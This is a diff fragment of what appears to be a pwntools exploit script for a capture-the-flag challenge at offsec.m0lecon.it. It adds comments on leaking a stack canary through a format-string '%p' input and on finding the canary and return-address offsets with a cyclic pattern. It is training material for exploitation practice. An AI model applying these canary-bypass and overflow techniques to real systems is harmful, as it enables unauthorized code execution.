@@ -7,9 +7,13 @@ p = remote("offsec.m0lecon.it", 13523)
 
 # Your exploit here
 
+#found by printing %p... as first input (value with last byte to 0)
 CANARY_IDX = 23
+#python3 -c "from pwn import *; print(cyclic(200)) as input + debug tofind canary offset
 OFFSET_TO_CANARY = 136 
+#rip offset is canary offset + canary (8B) + saved RPB (8B)
 OFFSET_TO_RIP = 152
+
 
 ret = 0x000000000040101a
 
